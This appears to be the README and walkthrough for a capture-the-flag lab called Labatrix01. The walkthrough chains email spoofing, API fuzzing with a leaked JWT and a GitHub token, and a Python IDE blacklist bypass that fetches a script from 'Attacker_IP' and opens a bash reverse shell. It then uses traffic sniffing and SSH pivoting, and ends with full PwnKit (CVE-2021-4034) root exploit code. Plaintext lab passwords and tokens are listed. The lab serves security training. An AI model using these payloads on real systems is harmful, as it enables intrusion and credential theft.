# Labatrix01

## Introduction

Labatrix01 is desgined to put your skills in Enumeration, breakout, lateral movement,privilege escalation, Web pentesting, Network pentesting, Docker pentesting, pivoting, Traffic Analysis, Source code review, binary exploitation to the test within a small containerized environment.

## Info for HTB

### Access

Passwords:

|Main Host|User|Password|
|---------|-----|--------------|
||labatrix01|ThisC@n'TbeG00uss3@BlE|


|Docker| User  | Password|
|------|-------|---------|
|Docker1|N/A |N/A|
|RestFul_API|administrator|WAT@Str0ngPass|
|IDE|dev_user|DE3v3l0perISR3@L!!|
|Docker2| networkadmin | q#f&EeM?Q+cpJwU7FMw5 |
|Docker3| developer |sczJz@22@ZkA*hAK|

### Key Processes

The used technologies in this machine: Django web server, Flask Web server, Docker containers, Python MAIL Server, FLASK RESFUL API, SSH, TCPDump.
Custome Code:
intentionally vulnerable versions: pkexec CVE-2021-4034.

We have the main host is running with Ubuntu 20.04.
On that host, there are three docker containers:
Docker_1: 
- Flask web server - Port 80.
- SMTP Server - Port 25.
- Flask Restfull API - Port 5000.
Docker_2:
- Django IDE - Port 8000.
- HTTP traffic sender sends data to webserver/8008 on Docker_3 (internal tool written by python)
- SSH Client
Docker_3
- HTTP Web Server - Port 8008 (internal tool written by python)
- SSH Server - port 22 (Internal)
- Pkexec local privesc.


### Automation / Crons

1. building Docker containers:
- What does it do?
A compose file for building 3 docker containers.
- How does it run?
It should be run manually each time the machine boots.

2. http traffic sender in docker_2:
- What does it do?
This tool keep sending http traffic that contains users information to docker_3 webserver.
- Why?
It's necessary, so the attacker can sniff the traffic and extract the users, after that test who is the right user to ssh on docker_3
- How does it do it? 
We are using python code, the tool name is "thesender.py"
- How does it run?
From the run.sh file in docker02, line number 6.

2. Corn job in the ubuntu machine to run the docker containers every time you reboot the machine.

### Docker

Docker_1: 
- Flask web server - Port 80.
- SMTP Server - Port 25.
- Flask Restfull API - Port 5000.

Docker_2:

- Django IDE - Port 8000.
- HTTP traffic sender sends data to webserver/8008 on Docker_3 (internal tool written by python)
- SSH Client

Docker_3

- HTTP Web Server - Port 8008 (internal tool written by python)
- SSH Server - port 22 (Internal)
- Pkexec local privesc.

### Other

- All the docker files required for building are saved here:


## Writeup

### General Scanning & Enumeration

NMAP:

```bash
nmap -sV -sC IP
```

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp-proxy Python SMTP Proxy 0.2
|_smtp-commands: SMTP: EHLO 502 Error: command "EHLO" not implemented\x0D
80/tcp   open  http       Werkzeug/2.1.2 Python/3.10.4
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.4
|     Date: Sat, 21 May 2022 16:29:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 7540
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" >
|     <head>
|     <meta charset="UTF-8">
|     <title>Project development discussion</title>
|     <link rel="stylesheet" href="/static/./style.css">
|     </head>
|     <body>
|     <!-- partial:index.partial.html -->
|     <!-- comments container -->
|     <div class="comment_block">
|     <!-- 
|     Comments are structured in the following way:
|     {ul} defines a new comment (singular)
|     {li} defines a new reply to the comment {ul}
|     example:
|     <ul>
|     <comment>
|     </comment
|     <li>
|     <reply>
|     </reply>
|     </li>
|     <li>
|     <reply>
|     </reply>
|     </li>
|     <li>
|     <reply>
|     </reply>
|     </li>
|     </ul>
|     <!-- used by #{user} to create a new comment -->
|     <div class="cre
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.4
|     Date: Sat, 21 May 2022 16:29:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.4
|_http-title: Project development discussion
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.10.4
|     Date: Sat, 21 May 2022 16:29:58 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   HTTPOptions: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.10.4
|     Date: Sat, 21 May 2022 16:30:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
8000/tcp open  http-alt   WSGIServer/0.2 CPython/3.10.4
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sat, 21 May 2022 16:30:03 GMT
|     Server: WSGIServer/0.2 CPython/3.10.4
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 179
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <title>Not Found</title>
|     </head>
|     <body>
|     <h1>Not Found</h1><p>The requested resource was not found on this server.</p>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 21 May 2022 16:29:58 GMT
|     Server: WSGIServer/0.2 CPython/3.10.4
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 259
|     Vary: Cookie
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!-- templates/home.html -->
|     <!-- templates/base.html -->
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <title>Home</title>
|     </head>
|     <body>
|     <main>
|     <p>You are not logged in</p>
|     href="/auth/login/">Log In</a>
|     </main>
|     </body>
|     </html>
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: WSGIServer/0.2 CPython/3.10.4
|_http-title: Home
8008/tcp open  http       BaseHTTPServer 0.6 (Python 3.6.9)
|_http-server-header: BaseHTTP/0.6 Python/3.6.9
|_http-title: Site doesn't have a title.
```

HTTP/80

We have a discussion page here regarding a project.

![image](images/80_project_development_discussion_page.png)

And here in the source code, we can see a lot of emails, those can be used in the SMTP

![image](images/80_project_development_discussion_page_sourcecode.png)

Going through the discussion page, I found this:

![image](images/chat_about_api.png)

As it looks, Steven Brown can't connect to the API and Carl Patterson asks him sending an email so he can send him back the required JSON file.
My guessing is that this JSON file can be used to connect to the API.

HTTP/8000

We have a login page here

![image](images/8000_login_page.png)

HTTP/5000

This is interesting, We are getting not 404 Not Found.

![image](images/5000_Notfound.png)

Based on wappalyzer, we have Django, and flask here.

### Foothold

I will send an email using swaks pretending to be Steven Brown emailing Carl Patterson asking for the JSON file.

1- Run a SMTP server on your machine, so you can receive any emails.

```bash
sudo python -m smtpd -c DebuggingServer -n ip:port
```

2- Send the email.

```bash
swaks --to carlpatterson@labatrix.com --from stevenbrown@labatrix.com  -s ip:port --body "Hi Mr. Carl, would you please send me the json file"
```
![image](images/swaks_email.png)

As we can see here from the SMTP server we got a response with a base64 encoding:
![image](images/smtp_server.png)

After decoding it, we can found the following message: "Here is the json file. Kindly check my repo for more info.", that means maybe we have a repo to check or it's a rabbit whole!


Decode the base64

![image](images/base64_response_decoded.png)

So as it looks those are employees information, if you scroll down you will see this:

```json
{"email": "jnor@google.org","phone": "1-535-274-7686","name": "Jesy Norris","APIKey":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsImV4cCI6MTY1MzIzNTEzM30.QKxNfozTdv0IETgBZxlta4wVxWvdN1uHS6QdLbtXopA"},
```

This is an APIKey!

### API Scanning & Enumeration

In this phase we are going to do directory/parameter enumeration.

Let's start with directory enumeration:

```bash
wfuzz -w top-10k-web-directories_from_10M_urlteam_links.txt --hc 404 http://IP:5000/FUZZ
```
I got this "/login", but when I browse this path I get this message

![login](images/5000_login.png)

After trying multiple wordlists and multiple directory/parameters brute forcing techniques, I noticed that everytime I use the following command:

```bash
wfuzz -z file,directory-list-2.3-medium.txt -z file,directory-list-2.3-medium.txt --hc 404,500 http://IP:5000/FUZZ/FUZ2Z
```
I get 404 http code response, I investigated more and found that when I try to access http://IP:5000/FUZZ/FUZ2Z => I get 404, but here: http://IP:5000/employees/FUZZ => I get a different response message **Token is missing! Please check the parameters and the token**
Here I went further and added one more paratmeter: http://IP:5000/employees/FUZZ/FUZ2Z => I get 404

In that moment I knew two things:
1. The endpoint is /employees
2. anything after /employees needs a parameter and token
my guessing is the parameter here called "token" and maybe the token we found in Carl JSON file be used here.

here is the final command:

```bash
wfuzz -z file,directory-list-2.3-medium.txt --hc 404,500 "http://IP:5000/employees/FUZZ?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsImV4cCI6MTY1MzIzNTEzM30.QKxNfozTdv0IETgBZxlta4wVxWvdN1uHS6QdLbtXopA"
```

I found alot of users:

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                       
=====================================================================

000000820:   200        1 L      7 W        87 Ch       "dev"                                                                         
000003021:   200        1 L      12 W       106 Ch      "david"                                                                       
000003880:   200        1 L      12 W       106 Ch      "mark"                                                                        
000005010:   200        1 L      12 W       108 Ch      "jason"                                                                       
000006736:   200        1 L      12 W       109 Ch      "paul"                                                                        
000006717:   200        1 L      12 W       107 Ch      "scott"                                                                       
000007252:   200        1 L      12 W       110 Ch      "james"                                                                       
000007736:   200        1 L      12 W       107 Ch      "sara"                                                                        
000008039:   200        1 L      12 W       111 Ch      "robert"                                                                      
000008395:   200        1 L      12 W       110 Ch      "thomas"                                                                      
000008423:   200        1 L      12 W       120 Ch      "andrew"                                                                      
000010959:   200        1 L      12 W       111 Ch      "justin"                                                                      
000011706:   200        1 L      12 W       105 Ch      "annie"                                                                       
000012470:   200        1 L      12 W       108 Ch      "henry"                                                                       
000013349:   200        1 L      12 W       106 Ch      "grace"                                                                       
000014668:   200        1 L      12 W       111 Ch      "keith"                                                                       
000016123:   200        1 L      12 W       109 Ch      "ryan"                                                                        
000017589:   200        1 L      12 W       109 Ch      "steven"                                                                      
000018260:   200        1 L      12 W       115 Ch      "matthew"                                                                     
000020763:   200        1 L      12 W       109 Ch      "dennis"                                                                      
000021730:   200        1 L      12 W       111 Ch      "andrea"                                                                      
000022375:   200        1 L      14 W       164 Ch      "carl"                                                                        
000022935:   200        1 L      12 W       109 Ch      "tracy"                                                                       
000024053:   200        1 L      12 W       108 Ch      "emily"                                                                       
000024454:   200        1 L      12 W       112 Ch      "rachel"                                                                      
000026428:   200        1 L      12 W       117 Ch      "jonathan"                                                                    
000026936:   200        1 L      12 W       107 Ch      "dawn"                                                                        
000031376:   200        1 L      12 W       111 Ch      "joseph"                                                                      
000042907:   200        1 L      12 W       112 Ch      "stephen"                                                                     
000046026:   200        1 L      12 W       109 Ch      "bonnie"                                                                      
000046929:   200        1 L      12 W       107 Ch      "jerry"                                                                       
000049057:   200        1 L      12 W       106 Ch      "julia"
```

- *Carl* user has a github token and he already mentioned in the email that he has a repo that we can check.
- *Dev* user has a username and password.
	![image](images/api_carl_info.png)
	![image](images/api_dev_info.png)

### Python IDE / 8000

Use the *dev*'s credential to login to IDE page on port 8000, after loggin you will get the follwoing: 

![image](images/python_ide.png)

I couldn't exploit this IDE, so I moved forward to the github repo that mentioned in *Carl* info, maybe I can find something interesting there.

### Carl Github

I searched for Carl Patterson - the name I found from the API - in github and I found this:

![image](images/carl_patterson_github_profile.png)


it looks like that guy is the programmer of the PythonIDE, the page we found on port 8000 but I can't see any code here, my guessing is that he has a private repo.
Let's use the github token we found before.

```bash
git clone https://carlpatterson36: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@github.com/carlpatterson36/PythonIDE
```

![image](images/inside_PythonIDE_Folder.png)

The code we found in *views.py* is the following:

```python
from django.shortcuts import render
import sys
import re

# Create your views here.

def index(request):
	return render(request, 'home.html')

def runcode(request):
	blacklist = ['os','system','subprocess','socket','!','@','#','$','%','^','&','*','ls','pwd','bash','id','uname','cd','rm','mv','touch','mkdir','sudo','reboot','shutdown','echo','cat','kill','ping','grep']
	if request.method == "POST":
		codeareadata = request.POST['codearea']
		# the blacklist filter
		codefilter = codeareadata.split("\r\n")
		for i in codefilter:
			i1 = re.split(" |\.|\(|\)|,|'",i)
			print(i1)

			for n in i1:
				if n in blacklist:
					print("It's in the blacklist!!!!!")
					codeareadata = ""
			else:
				pass

		try:
			
			original_stdout = sys.stdout
			sys.stdout = open('pyinputs.txt', 'w')


			# execute code
			exec(codeareadata)

			sys.stdout.close()

			sys.stdout = original_stdout # resect the standard output to its original value

			# read output from pyinputs.txt and save it in output variable

			output = open('pyinputs.txt', 'r').read()
		except Exception as e:
			# return errors in the code

			sys.stdout = original_stdout
			output = e


	# return and render index page and send codeareadata and output to show on page

	return render(request, 'home.html', {"code":codeareadata, "output":output})
  ```
  
So basically this is looping in the inputs and removing anything included in the blacklist.

### IDE Exploit

Run listener on your machine 

```bash
nc -nvlp 9911
```

Run HTTPServer as well

```python
python3 -m http.server
```
rev.sh:

```bash
bash -i >& /dev/tcp/Attacker_IP/9911 0>&1
```

Here is my bypass:

```bash
c1 = 'o'
c2 = 's'
c3 = c1 + c2
c4 = "import {}".format(c3)
exec(c4)
s1 = '.sy'
s2 = 'st'
s3 = 'em'
s4 = s1+s2+s3
fullcommand = "{}{}('wget http://Attacker_IP:8000/rev.sh && bash rev.sh')".format(c3,s4)
exec(fullcommand)
```
and here is the full process:

![image](images/PythonIDEBypass_http.server_reverseshell.png)

### Internal Enumeration

```
whoami
```
![image](images/whoami.png)

Once you gain access via reverse shell, you can get the **first flag** in home directory of *networkadmin* user.

```
uname -a
```

![image](images/uname_a.png)


```
ps aux
```
![image](images/ps_aux.png)

```
sudo -l
```
![image](images/sudo_l.png)

Let's try tcpdump, let see what we get

```
tcpdump -a
```
![image](images/tcpdump_a_results.png)

As it looks, we have a lot of communication between "Server2" and "CVE.docker_images_customnetwork.8008"
Let's analyze more 

```
sudo tcpdump -A dst port 8008
```
Using -A to print each packet we can see packets in more details.
This packet caught my eyes.

![image](images/apcket_caught_myeyes.png)

As you can see we have a Name and a SecretKey, it is url-encoded. Let's decode it.

![image](images/packet_data_url_decoded.png)

name=Developer+Basha&email=developer@protonmail.org&SecretKey=sczJz@22@ZkA*hAK&phone=(222)+549-6558&date=Nov+2,+2021

I want to know how to use this, as we saw in the network analysis this data is going to CVE machine, so I'm curious what is this docker
first of all, I Want to know what's my ip.

```
cat /etc/hosts
```
![image](images/cat_etc_hosts.png)

our ip is "172.20.0.30"

Let's scan the network 

Generate the list of IPs we will scan.

```bash
for i in `seq 1 254`;do echo 172.20.0.$i;done >> ips.txt
```
There is nothing can be used by default from the system to scan the network (e.g ping), so I wrote a simple python port scanner.

```python
import socket

with open("ips.txt","r") as ips:
	for ip in ips:
		ip = ip.split("\n")
		print(ip[0])
		try:
			for port in [22,23,80,443]:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				socket.setdefaulttimeout(1)

				result = s.connect_ex((ip[0],port))
				if result == 0:
					print("Port {} is open".format(port))
				s.close()


		except KeyboardInterrupt:
			print("\n Exiting Program !!!!")
			sys.exit()
```

The results of the scanner:

```
172.20.0.1
Port 22 is open
Port 80 is open

172.20.0.10
Port 80 is open

172.20.0.20
Port 22 is open
```

As we can see, we have port 22 open on 172.20.0.20.

I tried to ssh multiple time using the reverse shell I gained, but I failed, I had  to spawn a TTY shell using python so I can ssh to 172.20.0.20

```python
python -c "import pty; pty.spawn('/bin/bash')"
```

Now ssh and use the credentials we captured before.

```bash
ssh developer@172.20.0.20
```

![image](images/sshed_to_cvedocker.png)

I downloaded linpeas.sh

```
chmod +x linpeas
./linpeas.sh
```

and I found this executable file and it looks like it's psexec vulnerability

![image](images/linpeas_results.png)

## PSEXEC Exploitation - CVE-2021-4034

- The goal here is to exploit the PSExec vulnerability and gain root access.

We will create the following files to exploit the vulnerability.
Let's call it exp.c:

```C
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv)
{
        char * const a_argv [] = { NULL};
        char * const a_envp[] = {
                "pwnkitdir",
                "PATH=GCONV_PATH=.",
                "CHARSET=PWNKIT",
                "SHELL=xxx",
                NULL
        };
        execve("/usr/local/bin/pkexec", a_argv, a_envp);
}
```

The second code lib.c:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void __attribute__ ((constructor)) exp(void);
static void exp(void)
{
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execve("/bin/sh", a_argv, a_envp);
}
```

The third file is a bash script to automate some steps, we will call it run.sh:

```bash
mkdir 'GCONV_PATH=.'
touch 'GCONV_PATH=./pwnkitdir'
chmod 777 'GCONV_PATH=./pwnkitdir'
mkdir pwnkitdir
touch pwnkitdir/gconv-modules
echo "module UTF-8// PWNKIT// pwnkit 1" >> pwnkitdir/gconv-modules
gcc -fPIC -shared lib.c -o pwnkitdir/pwnkit.so
gcc exp.c -o exp
```

Now let's run it:
```bash
./run.sh
```
If you will check in same folder you will find an executable file called *exp*.
Let's run it to gain the root access:
```bash
./exp
```
![image](images/gaining_the_root.png)

- In root home directory you will find your **root flag** file.
